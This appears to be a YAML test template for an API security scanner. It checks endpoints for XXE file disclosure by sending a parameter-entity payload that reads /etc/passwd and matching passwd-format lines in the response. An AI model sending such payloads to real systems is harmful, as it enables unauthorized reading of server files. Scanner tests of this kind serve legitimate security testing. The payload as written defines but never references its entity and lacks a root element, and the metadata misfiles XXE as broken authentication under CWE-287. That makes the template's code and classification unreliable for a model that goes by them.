id: XXE_PARAMETER_ENTITY_FILE_DISCLOSURE
info:
  name: "XML External Entity (XXE) Vulnerability test with Parameter Entity for File Disclosure in API Endpoints"
  description: >
    "This test can be used to to uncover API susceptibilities to XXE attacks that manipulate parameter entities to access sensitive files."
  details: >
    "This test evaluates the APIs for vulnerabilities where XML parameter entities are used in XXE attacks to illicitly disclose internal file contents."
  impact: >
    "Exploiting XXE through parameter entities can critically breach data security, leading to unauthorized file access and potentially compromising sensitive information within the API framework."
  category:
    name: NO_AUTH
    shortName: Broken Authentication
    displayName: Broken User Authentication (BUA)
  subCategory: XXE_PARAMETER_ENTITY_FILE_DISCLOSURE
  severity: HIGH
  tags:
    - Business logic
    - OWASP top 10
    - HackerOne top 10
  references:
    - "https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/"
    - "https://github.com/OWASP/API-Security/blob/master/editions/2023/en/0xa2-broken-authentication.md"
    - "https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html"
  cwe:
    - CWE-287
  cve:
    - CVE-2020-24008
    - CVE-2021-45901

api_selection_filters:
  response_code:
    gte: 200
    lt: 300
  response_payload:
    length:
      gt: 0
    not_contains:
      - Error
      - Internal Server 
      - Failed
      - Unauthorized
      - access denied
      - Forbidden
      - Method Not allowed
      - Gateway timeout
      - request timeout
      - server error
      - server busy
      - authentication error
      - authorization error
      - validation error
      - Permission Denied
      - invalid token
      - token expired
      - session expired
      - session timeout
      - unexpected error
      - unable to process request
      - bad request
      - service unavailable
      - account is locked
      - account is blocked
      - multiple failed attempts
  request_headers:
    for_one:
      key:
        contains_either:
          - content-type
          - Content-Type
        extract: headerKey
  method:
    contains_either:
      - POST
      - PUT
      - PATCH
wordLists:
  payloads:
    - "<!DOCTYPE test [<!ENTITY % param \"<!ENTITY xxe SYSTEM 'file:///etc/passwd'>\">%param;]>"
execute:
  type: single
  requests:
    - req:
        - replace_body:  ${payloads}
        - modify_header:
            ${headerKey}: "application/xml"
validate:
  response_payload:
    regex: "^([^:]+):([^:]*):(\\d+):(\\d+):([^:]*):([^:]*):([^:\\n\\r]*)$"
    length:
      gt: 0
    not_contains:
      - Error
      - Internal Server 
      - Failed
      - Unauthorized
      - access denied
      - Forbidden
      - Method Not allowed
      - Gateway timeout
      - request timeout
      - server error
      - server busy
      - authentication error
      - authorization error
      - validation error
      - Permission Denied
      - invalid token
      - token expired
      - session expired
      - session timeout
      - unexpected error
      - unable to process request
      - bad request
      - service unavailable
      - account is locked
      - account is blocked
      - multiple failed attempts
